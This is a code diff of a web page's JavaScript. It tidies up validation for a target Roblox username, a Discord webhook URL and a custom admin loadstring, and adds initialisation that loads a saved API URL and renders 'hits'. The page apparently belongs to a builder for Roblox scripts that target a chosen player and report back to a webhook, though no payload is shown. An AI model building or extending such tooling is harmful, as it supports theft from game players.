+  document.getElementById('customAdminInput').style.display = mode === 'custom' ? 'block' : 'none';
+}
+function updateCustomAdmin() { customAdminLoadstring = document.getElementById('customAdminLoadstring').value; }
+
 function validateUsername() {
-  const username = document.getElementById('usernameInput').value.trim();
-  const hint = document.getElementById('usernameHint');
-  if (username.length < 3) {
-    hint.classList.add('error');
-    hint.textContent = 'Username must be at least 3 characters long!';
-    return false;
-  } else {
-    hint.classList.remove('error');
-    hint.textContent = 'The Roblox username to target in the script (3 characters minimum).';
-    return true;
-  }
+  const v = document.getElementById('usernameInput').value.trim();
+  const h = document.getElementById('usernameHint');
+  if (v.length < 3) { h.classList.add('error'); h.textContent = 'Username must be at least 3 characters long!'; return false; }
+  h.classList.remove('error'); h.textContent = 'The Roblox username to target in the script (3 characters minimum).'; return true;
 }
 
 function validateWebhook() {
-  const webhook = document.getElementById('webhookInput').value.trim();
-  const hint = document.getElementById('webhookHint');
-  if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
-    hint.classList.add('error');
-    hint.textContent = 'Webhook must start with: https://discord.com/api/webhooks/';
-    return false;
-  }
-  const webhookRegex = /^https:\/\/discord\.com\/api\/webhooks\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
-  if (!webhookRegex.test(webhook)) {
-    hint.classList.add('error');
-    hint.textContent = 'Invalid webhook format. Must be: https://discord.com/api/webhooks/<ID>/<TOKEN>';
-    return false;
-  }
-  const parts = webhook.split('/');
-  const webhookId = parts[5];
-  const webhookToken = parts[6];
-  if (!/^\d{17,20}$/.test(webhookId)) {
-    hint.classList.add('error');
-    hint.textContent = 'Invalid webhook ID. Must be 17-20 digits.';
-    return false;
-  }
-  if (!/^[a-zA-Z0-9_-]{68,}$/.test(webhookToken)) {
-    hint.classList.add('error');
-    hint.textContent = 'Invalid webhook token. Must be 68+ alphanumeric characters with dashes/underscores.';
-    return false;
-  }
-  hint.classList.remove('error');
-  hint.textContent = '✅ Valid Discord webhook.';
-  return true;
+  const v = document.getElementById('webhookInput').value.trim();
+  const h = document.getElementById('webhookHint');
+  if (!v.startsWith('https://discord.com/api/webhooks/')) { h.classList.add('error'); h.textContent = 'Webhook must start with: https://discord.com/api/webhooks/'; return false; }
+  const re = /^https:\/\/discord\.com\/api\/webhooks\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
+  if (!re.test(v)) { h.classList.add('error'); h.textContent = 'Invalid webhook format. Must be: https://discord.com/api/webhooks/<ID>/<TOKEN>'; return false; }
+  h.classList.remove('error'); h.textContent = '✅ Valid Discord webhook.'; return true;
 }
 
 function copyOut() {
@@ -1726,14 +1290,19 @@ function copyOut() {
   if (!code || code.startsWith('--')) return;
   navigator.clipboard.writeText(code).then(() => {
     const btn = document.getElementById('copyBtn');
-    btn.textContent = '✓ Copied!';
-    btn.classList.add('ok');
+    btn.textContent = '✓ Copied!'; btn.classList.add('ok');
     setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
   });
 }
 
-renderList();
-renderHits();
+// ── INIT ─────────────────────────────────────────────────────────────────
+(function init() {
+  const saved = localStorage.getItem('skrinhub_api') || '';
+  document.getElementById('apiUrlInput').value = saved;
+  if (saved) checkApiUrl();
+  renderList();
+  renderHits([]);
+})();
 </script>
 </body>
 </html>
